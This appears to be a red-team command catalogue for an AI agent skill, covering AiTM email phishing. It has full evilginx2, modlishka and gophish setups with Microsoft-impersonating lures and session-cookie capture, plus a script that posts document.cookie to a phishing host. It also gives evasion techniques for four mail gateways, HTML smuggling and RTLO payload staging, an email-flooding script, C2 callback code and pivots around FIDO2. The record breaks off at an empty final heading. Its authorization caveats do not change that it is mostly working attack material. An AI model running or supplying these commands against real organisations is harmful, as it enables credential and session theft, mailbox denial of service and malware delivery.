# Email Security Deep — Payloads & Command Catalogue

> Companion to `SKILL.md`. Every command assumes lawful authorization, an executed NDA, a signed SoW naming the target recipients, sender identities, test window, and data-handling requirements for captured credentials/sessions. Unscoped phishing is a crime in most jurisdictions.
>
> Placeholder convention: `<target.com>` (victim org), `<victim@target.com>` (recipient), `<phish-domain>` (look-alike domain you have registered/authorized), `<lure_url>` (evilginx2 lure URL), `<gophish_key>` (gophish API key), `<c2_url>` (your authorized callback endpoint).

---

## 1. evilginx2 — AiTM Reverse Proxy (MFA Bypass)

### 1.1 Installation & First Run

```bash
# Clone and build evilginx2 (Go required)
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make                              # builds ./bin/evilginx

# Pre-stage directory structure
mkdir -p phishlets data logs
sudo cp -r phishlets/* phishlets/  # default phishlets

# Launch (root required for port 53/80/443 binding)
sudo ./bin/evilginx -p phishlets -d
#   -p phishlets  → phishlet directory
#   -d            → developer/debug mode
```

### 1.2 Core Configuration (inside evilginx CLI)

```
# Set the campaign domain and IP (must match DNS A record)
config domain <phish-domain>
config ip <your_vps_public_ip>

# Configure TLS (Let's Encrypt via ACME is built-in)
config redirector_ip <redirector_ip>     # optional, masks origin

# Bind a phishlet to a subdomain
phishlets hostname office365 login.<phish-domain>
phishlets enable office365

# Verify the phishlet comes up
phishlets

# Create a lure
lures create office365
lures edit 0 path '/security-reset'      # URL path victims hit
lures edit 0 redirect_url 'https://www.microsoft.com/en-us/'  # post-capture bounce
lures edit 0 phishlet sub_404 'false'    # don't return 404 on bad sub

# Retrieve the lure URL victims will click
lures get-url 0
# → https://login.<phish-domain>/security-reset?id=ABC123
```

### 1.3 Authoring a Custom Phishlet (O365 — excerpt)

```yaml
# phishlets/office365.yaml — illustrative excerpt, see evilginx2 phishlet format docs
author: 'kali-claw'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www',   orig_sub: 'www',   domain: 'office.com',         session: true, is_landing: false}
  - {phish_sub: 'outlook',orig_sub: 'outlook',domain: 'office365.com',     session: true, is_landing: false}

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'brcap', 'mkt']
  - domain: '.office.com'
    keys: ['rt', 'rt_FedAuth', 'MSPAuth', 'MSAuth1', 'RPSSecAuth']
  - domain: '.office365.com'
    keys: ['rt', 'FedAuth', 'rt_FedAuth']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
  code:
    key: 'code'
    search: '([0-9]{6})'
    type: 'post'

login:
  domain: 'login.microsoftonline.com'
  path: '/'

# JS injection — runs in victim's browser on the proxied page
injects:
  - domain: 'login.microsoftonline.com'
    trigger: 'login'
    content: |
      // FIDO2 detection (see Section 14)
      if (window.PublicKeyCredential) {
        window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable()
          .then(function(uvpa) {
            if (uvpa) fetch('https://login.<phish-domain>/beacon/fido2', {method:'POST'});
          });
      }
```

### 1.4 Session Capture Workflow

```
# Once a victim completes login + MFA through the proxy:
sessions
#  id   phishlet    username                tokens   ip          create_time
#  0    office365   victim@target.com       8        203.0.113.9 2026-06-17 10:42:03

# Export captured tokens for import into attacker browser (Cookie Quick Manager)
sessions 0
# prints the captured cookies for this session

# After review, delete per SoW
sessions delete 0
```

### 1.5 Operational Tips

- **Use a redirector** (Cloudflare Workers, Nginx, custom Caddy) so the true origin IP is not exposed via DNS / TLS history.
- **Rotate lure IDs** periodically; static lure IDs are a tell.
- **Monitor `sessions` table size** — a phishlet left running unattended will accumulate captured data; tear down when no longer needed.
- **The `ESTSAUTHPERSISTENT` cookie** is the key token for Azure AD persistent sessions; with this alone you can often import a session and operate.

---

## 2. evilgophish — evilginx2 + gophish Integration

### 2.1 What it Adds

- Wraps evilginx2 + gophish into a single orchestration script
- Auto-redirects victims from gophish landing page to evilginx2 lure URL
- Aggregates telemetry from both (email delivery + click + credential + session)
- Pre-built phishlet + template + landing page bundles

### 2.2 Setup

```bash
git clone https://github.com/An0nUD4Y/evilgophish.git
cd evilgophish

# Edit config
cat > config.json <<EOF
{
  "evilginx_path": "/opt/evilginx2",
  "gophish_path":  "/opt/gophish",
  "phishlet":      "office365",
  "phish_domain":  "<phish-domain>",
  "gophish_admin": "https://127.0.0.1:3333",
  "gophish_key":   "<gophish_key>"
}
EOF

# Launch (starts both evilginx2 and gophish, configures lure, exposes URL)
./evilgophish.sh
```

### 2.3 Campaign Launch via Combined Stack

```bash
# evilgophish exposes a helper that creates gophish entities + evilginx lure
./evilgophish.sh create-campaign \
  --name "Q2-redteam-001" \
  --template templates/urgent-password-reset.html \
  --group groups/engineering.csv \
  --sender "Microsoft Security <noreply@<phish-domain>>"
```

### 2.4 Combined Telemetry Pull

```bash
# Pull gophish results
curl -k https://127.0.0.1:3333/api/campaigns/1/results?api_key=$GOPHISH_API_KEY

# Pull evilginx2 sessions (via REST API if enabled, or via CLI dump)
sudo ./bin/evilginx -p phishlets -d -c 'sessions; exit'

# Merge on victim email/username to produce end-to-end funnel report:
#   sent → delivered → opened → clicked → credential-captured → session-captured → fido2-blocked
```

---

## 3. modlishka — Flexible Reverse Proxy with Template Injection

### 3.1 When to Use modlishka vs evilginx2

| | evilginx2 | modlishka |
|---|-----------|-----------|
| Phishlet model | Per-service YAML phishlets | Generic — any service, JS template injection |
| Configuration | Declarative | Imperative flags |
| Strength | Pre-built O365/Google/etc phishlets, polished | Genericity — works against niche services w/o phishlet |
| Use case | Standard AiTM campaign | Niche / bespoke service |

### 3.2 Build & Run

```bash
git clone https://github.com/drk1wi/modlishka.git
cd modlishka
make

# Launch against a generic target
sudo ./modlishka \
  -proxyaddress 0.0.0.0 \
  -proxyport 443 \
  -targetdomain login.target.com \
  -listeningdomain <phish-domain> \
  -cert cert.pem -certkey key.pem \
  -trackparams 'username,password,code,session' \
  -jsrules 'rules.json'
```

### 3.3 JS Rule Example

```json
// rules.json — inject this into the proxied page
{
  "login.target.com": [
    {
      "pattern": "</body>",
      "replace": "<script>fetch('https://<phish-domain>/beacon',{method:'POST',body:document.cookie})</script></body>"
    }
  ]
}
```

### 3.4 Operational Note

modlishka's permissiveness cuts both ways — it will proxy anything, including services you didn't intend to phish. Scope it tightly via `-targetdomain` to avoid inadvertently capturing credentials for out-of-scope services.

---

## 4. gophish — Campaign Platform

### 4.1 Install & First Run

```bash
# Download from getgophish.com
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-arm64.zip
unzip gophish-v0.12.1-linux-arm64.zip
chmod +x gophish

# Edit config.json — bind admin interface to localhost only
# {
#   "admin_server": {"listen_url": "127.0.0.1:3333", ...},
#   "phish_server": {"listen_url": "0.0.0.0:80", ...}
# }

./gophish
# Initial admin password printed to stdout — CHANGE FIRST
# Access via SSH tunnel: ssh -L 3333:127.0.0.1:3333 user@vps
```

### 4.2 Sending Profile (SMTP relay)

```bash
# Via API
curl -k -X POST https://localhost:3333/api/smtp/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "microsoft-relay",
    "host": "mail.<phish-domain>:587",
    "from_address": "Microsoft Security <noreply@<phish-domain>>",
    "username": "sender",
    "password": "staged-cred",
    "ignore_cert_errors": false,
    "headers": {"X-Priority": "1", "X-MS-Exchange-Organization-MessageClass": "IPM.Note"}
  }'

# Test sending
curl -k -X POST https://localhost:3333/api/smtp/1/send_test_email \
  -H "Authorization: Bearer $GOPHISH_API_KEY"
```

### 4.3 Landing Page (with evilginx2 redirect)

```bash
curl -k -X POST https://localhost:3333/api/pages/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "office365-login",
    "html": "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0; url={{.URL}}\"></head><body>Redirecting…</body></html>",
    "redirect_url": "https://login.<phish-domain>/security-reset",
    "capture_credentials": false,
    "capture_passwords": false
  }'

# {{.URL}} is gophish magic — replaced with the tracking link
# Click is tracked by gophish; final redirect to evilginx2 lure
```

### 4.4 Email Template

```bash
curl -k -X POST https://localhost:3333/api/templates/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "urgent-password-reset",
    "subject": "Action Required: Password Expiry in 24h",
    "html": "<html><body><p>Dear {{.FirstName}},</p><p>Your password expires in 24 hours. Reset now to avoid account lockout.</p><p><a href=\"{{.URL}}\">Reset Password</a></p><p>— Microsoft Security</p></body></html>",
    "text": "Dear {{.FirstName}}, password expires in 24h. Reset: {{.URL}}",
    "attachments": []
  }'

# {{.FirstName}}, {{.LastName}}, {{.Email}}, {{.URL}}, {{.TrackerURL}} are gophish magic tokens
# {{.URL}} and {{.TrackerURL}} are the click-tracking link and the 1x1 beacon respectively
```

### 4.5 Recipient Group

```bash
# CSV format: First Name,Last Name,Email,Position
cat > engineering.csv <<EOF
First Name,Last Name,Email,Position
Jane,Engineer,jane@target.com,Senior Engineer
Bob,Manager,bob@target.com,Eng Manager
EOF

# Import via API
curl -k -X POST https://localhost:3333/api/groups/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -F "name=engineering-team" \
  -F "file=@engineering.csv"
```

### 4.6 Launch Campaign

```bash
curl -k -X POST https://localhost:3333/api/campaigns/ \
  -H "Authorization: Bearer $GOPHISH_API_KEY" \
  -d '{
    "name": "Q2-redteam-001",
    "template": {"name": "urgent-password-reset"},
    "page": {"name": "office365-login"},
    "smtp": {"name": "microsoft-relay"},
    "groups": [{"name": "engineering-team"}],
    "launch_date": "2026-06-20T09:00:00Z"
  }'
```

### 4.7 Pull Results (post-campaign report)

```bash
CAMPAIGN_ID=1
curl -k https://localhost:3333/api/campaigns/$CAMPAIGN_ID/results?api_key=$GOPHISH_API_KEY | jq '.'
# Returns: sent, opened, clicked, submitted (if cred capture), error, per-recipient timeline
```

---

## 5. King-Phisher — Alternative Campaign Platform

### 5.1 Install (server + client)

```bash
# Server side (Ubuntu/Debian)
wget -q https://github.com/rsmusllp/king-phisher/raw/master/tools/install.sh
sudo bash install.sh

# Launch server
sudo king-phisher-rpc -C king-phisher.yml &

# Client (GUI)
king-phisher
```

### 5.2 When to Use King-Phisher over gophish

- Awareness-training use case (built-in template scoring, click-rate dashboards for HR)
- GTK desktop UX preferred
- Need SMB-aware beacon callbacks (King-Phisher has stronger internal-network callback options)

### 5.3 Sample Campaign (excerpt from YAML config)

```yaml
# campaign.yaml
name: Q2-awareness-test
message:
  subject: "Required: Security Training"
  html_file: templates/training.html
  text_file: templates/training.txt
smtp:
  server: mail.<phish-domain>
  port: 587
  username: sender
  password_file: /etc/king-phisher/smtp.pass
web:
  url: https://training.<phish-domain>/start
  track_visits: true
targets:
  - email: jane@target.com
    name: "Jane Engineer"
```

---

## 6. Email Gateway Evasion — Proofpoint

### 6.1 Proofpoint URL Defense Behavior

- Rewrites URLs in delivered mail to `https://urldefense.proofpoint.com/v2/url?u=<base64-encoded>&d=DwMFaQ&...`
- At click time, Proofpoint resolves the encoded URL, checks fresh threat intel, and either:
  - Allows (browser redirects to original)
  - Blocks (presents warning page)
  - Sandboxes (presents page through Proofpoint browser isolation)

### 6.2 Evasion Approaches (authorized testing)

- **Delayed activation**: host benign content at delivery time, swap to malicious at click time. URL Defense's click-time check is the counter-control — test that you can defeat it via short-rotation DNS or fast-flux.
- **File-type allowlist abuse**: Proofpoint often allows `.html`, `.htm` for direct attachment. HTML smuggling reconstructs the binary client-side — gateway sees only HTML.
- **Look-alike domain rotation**: register multiple look-alikes, rotate daily; threat-intel lag works in your favor.
- **Encrypted archive**: `.zip` with password (sent in separate channel or pre-text). Proofpoint cannot unzip without the password, so cannot detonate.
- **Macro-free payload**: Proofpoint detonation often focuses on macros; HTML/JS smuggling or signed-binary abuse (Sigthief) bypasses.

### 6.3 Detecting URL Defense in Delivered Mail

```bash
# Send a probe mail and inspect received headers/body
swaks --to probe@target.com --from test@<phish-domain> \
  --server mail.target.com \
  --header "Subject: probe" \
  --body "https://<phish-domain>/test"

# On the receiving side, inspect:
grep -E '(urldefense|X-PP|Proofpoint)' /var/mail/victim
# If URLs are rewritten, you'll see urldefense.proofpoint.com prefix
```

### 6.4 Bypass Test: bypassing URL rewrite

```bash
# Some Proofpoint configs exclude certain domains from rewriting
# (allow-listed internal domains, certain TLDs, etc.)
# Test: which of your look-alikes escape rewriting?

for d in micros0ft-login.com m1crosoft-login.com microsoft-security.net; do
  swaks --to probe@target.com --from test@$d \
    --body "https://$d/test" --server mail.target.com
  # Inspect received mail — is the URL rewritten or original?
done
```

---

## 7. Email Gateway Evasion — Mimecast

### 7.1 Mimecast Auth Posture / URL Expansion

- Mimecast rewrites URLs at click time (similar to Proofpoint)
- Mimecast sandbox detonates attachments
- Mimecast evaluates sender reputation (DKIM/SPF/DMARC + Mimecast's own reputation DB)

### 7.2 Evasion Approaches

- **DKIM-aligned sending**: spoofed-from on a look-alike with SPF/DKIM/DMARC aligned for your look-alike — passes Mimecast's auth check (note: this does NOT spoof the real Microsoft, it just makes your look-alike look legitimate).
- **Look-alike + warmed IP**: warm up your sending IP via small-volume legitimate-looking traffic for 7-14 days; Mimecast reputation ramps.
- **Attachment sandboxing bypass**: encrypted-zip (password out-of-band), or HTML smuggling, or signed-but-malicious binary.
- **Mimecast "Permitted Senders" abuse**: if a target has misconfigured Permitted Senders (e.g., allowed `*@sharepointonline.com`), register a look-alike at `sharepointonline.com` (won't work — that's Microsoft's real domain — but variants like `sharepoint-online-portal.com` may slip if misconfigured).

### 7.3 Probe Test

```bash
# Send probe mail with a tracking pixel
swaks --to probe@target.com --from "SharePoint <noreply@<phish-domain>>" \
  --body '<img src="https://<phish-domain>/beacon/probe1.png" width=1 height=1 />' \
  --header "Content-Type: text/html" \
  --server mail.target.com

# Check your beacon server access log for hits from Mimecast IP ranges
# (Mimecast pre-fetches images for some configs)
tail -f /var/log/nginx/access.log | grep -E '(mimecast|193|91)'
```

---

## 8. Email Gateway Evasion — Cisco ESA (IronPort)

### 8.1 Cisco ESA Key Features

- DLP (data loss prevention) for outbound; for inbound, anti-spam/anti-phish
- Sandbox detonation (Cisco ThreatGRID / Talos)
- URL filtering (Talos reputation)
- Mail policies per-sender

### 8.2 Evasion Approaches

- **Talos reputation ramp**: brand-new sending IPs are scored low; warm up via legitimate-looking traffic
- **Attachment type allowlist**: Cisco ESA often allows `.iso`, `.img`, `.lnk` that other gateways block. Test each extension against the client's policy.
- **Header injection abuse**: ESA sometimes processes X-headers in ways that bypass DLP — test malformed headers.
- **Mail-policy race**: some ESA configs apply different policies to internal-vs-external senders; if you can spoof an internal sender (depends on SPF enforcement — see `email-protocol-attack`), you may bypass inbound scan.

### 8.3 Probe — Mail-Policy Detection

```bash
# Send two probes — one "internal", one "external" — compare treatment
swaks --to probe@target.com --from internal@target.com \
  --body "test1" --server mail.target.com
swaks --to probe@target.com --from external@external.com \
  --body "test2" --server mail.target.com

# Compare X-IronPort-* headers on the receiving side
# If internal-spoofed probe has fewer anti-spam headers, policy bypass exists
```

---

## 9. Email Gateway Evasion — Microsoft Defender for Office

### 9.1 Defender Safe Links

- Rewrites URLs in mail to `https://*.safelinks.protection.outlook.com/?url=<encoded>&data=...`
- At click time, checks current URL reputation (not just delivery-time)
- Re-writes URLs in Teams/Office documents too

### 9.2 Defender Safe Attachments

- Detonates attachments in VM sandbox before delivery
- If sandbox detects malicious behavior → quarantines; if clean → delivers
- Has "Dynamic Delivery" mode — delivers text + placeholder, swaps in attachment post-detonation

### 9.3 Evasion Approaches

- **Time-of-check vs time-of-use (TOCTOU)**: host benign content at delivery; switch to malicious in the click-time window. Safe Links counter-checks at click time, so the window is narrow — but DNS rotation / fast-flux can defeat.
- **Detonation-aware payload**: payloads that detect sandbox (sleep long, check for VM artifacts, check user interaction) and only execute malicious path on real victim. (See `skills/av-edr-evasion/`.)
- **HTML smuggling**: gateway sees only HTML/JS; reconstruction happens in victim's browser post-delivery.
- **Macro-free initial access**: bypass macro blocking via `search-ms:` protocol, `.url` files, `ms-msdt:` (recently restricted), or signed-binary abuse.
- **Defender "tenant allow/block list" abuse**: if a target has over-permissive allow-list entries (e.g., allowed `*.sharepoint.com` even though they don't use SharePoint), use that domain for hosting.

### 9.4 Safe Links Rewriting Probe

```bash
# Send probe; inspect received body
swaks --to probe@target.com --from test@<phish-domain> \
  --body '<a href="https://<phish-domain>/test">click</a>' \
  --header "Content-Type: text/html" \
  --server mail.target.com

# On receiving side:
grep -o 'safelinks.protection.outlook.com' /var/mail/victim
# If present → Safe Links is rewriting
# Inspect which domains are excluded from rewriting (Tenant Allow/Block List)
```

---

## 10. Sender Reputation Engineering (for Spoofing Success)

> **Note**: This section overlaps with `email-protocol-attack` at the high level (SPF/DKIM/DMARC fundamentals). Here we go DEEPER on the *reputation* layer — BIMI, ARC, MX hygiene, IP warmup — for the goal of *spoofing success* (delivering as a look-alike identity that the gateway trusts).

### 10.1 The Reputation Stack

```
Layer          | What Gateways Evaluate
─────────────────────────────────────────────────
SPF            | IP-based sender authorization (protocol layer — see email-protocol-attack)
DKIM           | Cryptographic signature (protocol layer — see email-protocol-attack)
DMARC          | SPF+DKIM alignment enforcement (protocol layer)
─────────── below: reputation layer (this section) ───────────
BIMI           | Brand Indicators (visible logo) — gateway/user trust signal
ARC            | Authenticated Received Chain — preserves auth across forwarders
MX hygiene     | Are your MX records clean (no orphaned MX, no leaky subdomains)?
IP reputation  | Warming up new IPs, monitoring for blacklists (Spamhaus, Barracuda)
Domain age     | Brand-new domains are scored low; warm up with non-phish traffic first
TLS reporting  | TLS-RPT shows you whether your mail is reaching via TLS or being downgraded
DMARC reports  | rua reports tell you what mail is being sent "as you"
Volume ramp    | New IP at full volume = flagged; gradual ramp = trusted
```

### 10.2 BIMI Setup (trust signal)

```dns
// DNS TXT record at default._domainkey.<phish-domain>
// (BCI — BIMI Certification Indicator; requires VMC from CA)
default._domainkey.<phish-domain>.  IN  TXT "v=BIMI1;l=https://<phish-domain>/logo.svg;a=https://<phish-domain>/vmc.pem"
```

### 10.3 ARC Setup (forwarding)

```dns
// ARC preserves auth across legitimate forwarders
// Setup involves signing outbound with ARC-Seal header
// See RFC 8617
```

### 10.4 IP Warmup Schedule (new sending IP)

```text
Day 1-2:     10 msgs/hr to internal test addresses
Day 3-5:     50 msgs/hr, ramp to 200/day
Day 6-9:     500 msgs/day, mix of senders
Day 10-14:   2000 msgs/day
Day 15+:     full campaign volume
```

### 10.5 Blacklist Monitoring

```bash
# Check major blacklists (periodic during campaign)
for bl in zen.spamhaus.org bl.spamcop.net b.barracudacentral.org; do
  reversed=$(echo $SENDING_IP | awk -F. '{print $4"."$3"."$2"."$1}')
  dig +short $reversed.$bl A
done

# If listed → pause campaign, request delisting per blacklist process
```

### 10.6 DMARC Report Analysis (sender side)

```bash
# Your rua reports tell you what's being sent "as you" — useful to detect impersonation of YOUR look-alike
# Set rua mailbox, parse incoming XML reports
grep -lr 'dmarc' /var/mail/dmarc/ | while read f; do
  python3 dmarc_parse.py < $f
done
```

---

## 11. Email Bombing / DoS

### 11.1 BombErAtom (authorized DoS — notification fatigue test)

```bash
git clone https://github.com/BombErAtom/Email-Bomber.git
cd Email-Bomber
python3 email_bomber.py \
  --target victim@target.com \
  --count 200 \
  --threads 8 \
  --delay 2 \
  --provider list.txt   # list of public SMTP providers (use only authorized)

# IMPORTANT: keep count low (100-200) for fatigue-testing; high counts cause real harm
# (mail quota exhaustion, legitimate mail bounce, IR team distraction)
```

### 11.2 Custom Python Flooder (rate-limited)

```python
# flood.py — for AUTHORIZED notification-fatigue test only
import smtplib, threading, time
from email.mime.text import MIMEText

RATE = 5  # msgs/sec per thread
THREADS = 4
DURATION = 60  # seconds

def flood(target, stop):
    while not stop.is_set() and time.time() < start + DURATION:
        msg = MIMEText(f"notification {time.time()}")
        msg['Subject'] = 'notification'
        msg['From'] = 'noreply@<phish-domain>'
        msg['To'] = target
        try:
            with smtplib.SMTP('mail.<phish-domain>', 587, timeout=10) as s:
                s.sendmail('noreply@<phish-domain>', [target], msg.as_string())
        except Exception: pass
        time.sleep(1.0/RATE)

if __name__ == '__main__':
    import sys
    target = sys.argv[1]
    stop = threading.Event()
    start = time.time()
    ts = [threading.Thread(target=flood, args=(target, stop)) for _ in range(THREADS)]
    for t in ts: t.start()
    for t in ts: t.join()
```

### 11.3 Defense-Side Detection (for the report)

```bash
# Aggregate inbound to single mailbox per minute
awk '/to=<victim@target\.com>/ {print substr($1,1,15)}' /var/log/mail.log \
  | sort | uniq -c | sort -rn | head

# Alert threshold: > 50 msgs/min to single recipient from diverse senders
# Remediation: gateway rate-limit per recipient + CAPTCHA on inbound form-to-mail
```

---

## 12. Landing Page + Payload Staging

### 12.1 HTML Smuggling (gateway sees only HTML/JS)

```html
<!-- payload.html — reconstructs binary client-side -->
<script>
// Base64-encoded binary (placeholder)
const payload_b64 = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAAA...";
const payload_bin = atob(payload_b64);
const bytes = new Uint8Array(payload_bin.length);
for (let i = 0; i < payload_bin.length; i++) bytes[i] = payload_bin.charCodeAt(i);
const blob = new Blob([bytes], {type: 'application/octet-stream'});
const url = URL.createObjectURL(blob);
const a = document.createElement('a');
a.href = url;
a.download = 'document.pdf.exe';  // or hide extension via LFI/RTLO
document.body.appendChild(a);
a.click();
</script>
```

### 12.2 Decrypted-on-Click Attachment

```bash
# Build encrypted zip with password
zip -e --password 'P@ssw0rd2026' document.zip payload.exe

# Send password via separate channel (SMS, second mail, landing-page text)
# Gateway cannot unzip without password → cannot detonate → delivers as-is
```

### 12.3 Right-to-Left Override (RTLO) for Extension Spoofing

```bash
# File named: invoice[U+202E]txt.scr  → displays as invoice scr.txt
# Embed RTLO unicode in filename
# Many gateways now strip RTLO — test effectiveness
mv payload.exe $'invoice\xe2\x80\xaetxt.scr'
```

### 12.4 Landing-Page Trust Signals

- **TLS** — must be valid cert; mismatched/self-signed is an instant tell
- **Brand logo** — pulled from real site (verify licensing; or use client's authorized brand assets in test)
- **No "phishing-tells"** — no spelling errors, no broken images, no off-brand fonts
- **Mobile-rendering** — majority of clicks are mobile; test on iOS Safari + Android Chrome
- **Favicon** — pull from real site (often overlooked)

---

## 13. Post-Click Telemetry & Beacon Design

### 13.1 Open Tracking (1x1 Beacon)

```html
<!-- In email body (HTML) -->
<img src="https://<phish-domain>/beacon/open?id={{.TrackerURL}}" width="1" height="1" alt="" />
```

```python
# beacon.py — Flask endpoint
from flask import Flask, request, send_file, Response
app = Flask(__name__)

@app.route('/beacon/open')
def beacon_open():
    victim_id = request.args.get('id')
    # log victim open event
    log_event(victim_id, 'open', request.headers.get('User-Agent'))
    return Response(send_file('1x1.png'), mimetype='image/png')
```

### 13.2 Click Tracking

```python
@app.route('/click')
def click():
    victim_id = request.args.get('id')
    log_event(victim_id, 'click', request.headers.get('User-Agent'))
    return redirect('https://login.<phish-domain>/lure/0')
```

### 13.3 C2 Callback Patterns

```python
# Victim machine calls back after payload executes
@app.route('/c2/register', methods=['POST'])
def c2_register():
    data = request.json
    victim_id = data['victim_id']
    hostname = data['hostname']
    user = data['user']
    log_event(victim_id, 'c2_register', {'hostname': hostname, 'user': user})
    return {'next_checkin': 60}
```

### 13.4 Funnel Report Generation

```python
# Aggregate per victim: sent → delivered → opened → clicked → cred-captured → session-captured → fido2-blocked
import pandas as pd
events = pd.read_sql('select * from events', conn)
funnel = events.groupby('victim_id')['event'].apply(list)
funnel.to_csv('campaign_funnel.csv')
# Then build funnel-count report:
#   sent:           100
#   delivered:       98
#   opened:          45
#   clicked:         18
#   cred-captured:   12
#   session-captured: 9
#   fido2-blocked:    3
```

---

## 14. FIDO2 / Hardware Key Detection & Pivot

### 14.1 Browser-Side Detection

```javascript
// inject on landing page; signal C2 if FIDO2 present
async function check() {
  if (!window.PublicKeyCredential) return;
  const uvpa = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
  if (uvpa) {
    // AiTM will fail — FIDO2 assertion is bound to legitimate origin
    // Pivot required; signal C2
    fetch('https://<phish-domain>/beacon/fido2', {
      method: 'POST',
      body: JSON.stringify({victim_id: window.__victim_id__})
    });
    // Show alternative UI: device-code flow, consent phishing, etc.
  }
}
check();
```

### 14.2 Pivot Options When FIDO2 Blocks AiTM

| Pivot | Description | Notes |
|-------|-------------|-------|
| **Device-code flow phishing** | Present user with real Microsoft device-code prompt; ask them to enter the code at the legit login (passes MFA, attacker gets device token) | See `skills/cloud-identity-attack/` |
| **OAuth consent phishing** | Register an Azure AD app with sensitive scopes; ask victim to consent | Effective even with FIDO2 |
| **Session-token theft via XSS** | If target app has XSS, steal session token directly (no MFA involved) | Requires target-app vuln |
| **Token relay** | If victim has active session in another app (e.g., Edge with SSO), relay that | Browser/SSO dependent |
| **Pick a different target** | FIDO2 deployment is rarely uniform — find a user on TOTP/push | Realistic for large orgs |

### 14.3 FIDO2-Bypass Reporting (control strength)

When your campaign repeatedly fails against FIDO2-protected accounts, that is a positive security finding. Document:

```markdown
## Control Strength: FIDO2 Hardware Keys

The engagement measured FIDO2 deployment across 100 recipients. Of 18 click-throughs:

- 12 completed credential submission on AiTM page
- 9 of those reached MFA prompt
- 0 of 9 captured a session cookie (all used FIDO2 platform authenticator)
- 3 of 9 pivoted to device-code flow (compensating test)
- 0 of 3 device-code pivots succeeded (target users trained to refuse device-code prompts)

Recommendation: continue FIDO2 rollout; mandate FIDO2 for privileged roles; retain device-code-prompt
blocking; consider conditional access policies requiring compliant device.
```

---

## 15. Real-World AiTM Campaigns (Reference)

### 15.1 CozyCar / CozyDuke

- Russian APT (APT29) AiTM-flavored campaign
- Used credential-harvesting landing pages tied to malicious macro docs
- Lesson: combo of email-delivered macro + credential-capture landing

### 15.2 EvilProxy (MaaS, 2022+)

- Phishing-as-a-Service platform built on evilginx2-style AiTM
- Sold subscriptions to other actors
- Targeted O365, Google, GMX accounts
- Bypassed TOTP, push, SMS — could NOT bypass FIDO2
- Defeated by Microsoft's "Compliant Device" conditional access

### 15.3 NakedTenant (2023+)

- Targets Azure AD tenant enumeration + AiTM
- Identifies users without FIDO2, then phishes them specifically
- Demonstrates the value of FIDO2-uniform rollout

### 15.4 Reproducing in Lab

```bash
# Lab reproduction (authorized training only)
# 1. Stand up evilginx2 with O365 phishlet against a test O365 tenant
# 2. Create test users: user_totp (TOTP MFA), user_push (push), user_fido2 (FIDO2)
# 3. Run campaign against each
# 4. Measure: AiTM succeeds for totp/push; fails for fido2
# 5. Confirm conditional access "require compliant device" blocks AiTM session replay
```

---

## 16. AiTM Phishing Infrastructure — Complete Stand-up Playbook

> End-to-end evilginx2 + gophish deployment on a single hardened VPS. Every step assumes lawful authorization per a signed SoW. Replace `REPLACE_WITH_YOUR_X` placeholders before use.

### 16.1 VPS Provisioning and Hardening

```bash
# Provision Ubuntu 22.04+ VPS (2 vCPU / 4 GB RAM minimum)
# SSH in as root or sudo-capable user

apt update && apt upgrade -y
apt install -y ufw fail2ban build-essential git curl wget unzip python3 python3-pip nginx sqlite3 jq

# Firewall: SSH + HTTP (ACME + redirect) + HTTPS (evilginx2/gophish)
ufw default deny incoming
ufw allow 22/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw --force enable

# Disable SSH password auth
sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart ssh

# Enable fail2ban for SSH brute-force defense
systemctl enable --now fail2ban
```

### 16.2 DNS Records for the Look-alike Domain

```bash
# At your authorized registrar, configure for <phish-domain>:
#
#   Type  Host                          Value
#   ─────────────────────────────────────────────────────────────
#   A     login.<phish-domain>          <vps_public_ip>
#   A     mail.<phish-domain>           <vps_public_ip>
#   A     <phish-domain>                <vps_public_ip>
#   MX    <phish-domain>                10 mail.<phish-domain>
#   TXT   <phish-domain>                "v=spf1 ip4:<vps_public_ip> -all"
#   TXT   _dmarc.<phish-domain>         "v=DMARC1; p=none; rua=mailto:postmaster@<phish-domain>"
#   CNAME s1._domainkey.<phish-domain>  s1.<phish-domain>.<dkim_provider>   # if using ESP

# Verify propagation
dig +short login.<phish-domain>
dig +short MX <phish-domain>
dig +short TXT <phish-domain>
dig +short TXT _dmarc.<phish-domain>
```

### 16.3 evilginx2 Build and Operational Launch

```bash
# Install Go 1.21+
wget -q https://go.dev/dl/go1.21.13.linux-arm64.tar.gz
sudo tar -C /usr/local -xzf go1.21.13.linux-arm64.tar.gz
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc && source ~/.bashrc

# Build evilginx2
git clone https://github.com/kgretzky/evilginx2.git /opt/evilginx2-src
cd /opt/evilginx2-src && make

# Stage directories
sudo mkdir -p /opt/evilginx2/{phishlets,data,logs}
sudo cp ./bin/evilginx /opt/evilginx2/
sudo cp -r phishlets/* /opt/evilginx2/phishlets/

# Launch evilginx2 as a systemd service (recommended over interactive)
sudo tee /etc/systemd/system/evilginx2.service > /dev/null <<'EOF'
[Unit]
Description=evilginx2 AiTM reverse proxy
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
WorkingDirectory=/opt/evilginx2
ExecStart=/opt/evilginx2/evilginx -p /opt/evilginx2/phishlets
Restart=on-failure
RestartSec=5
StandardOutput=append:/opt/evilginx2/logs/evilginx2.log
StandardError=append:/opt/evilginx2/logs/evilginx2.err.log

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now evilginx2
sudo systemctl status evilginx2 --no-pager
```

### 16.4 evilginx2 First-Run Configuration via CLI

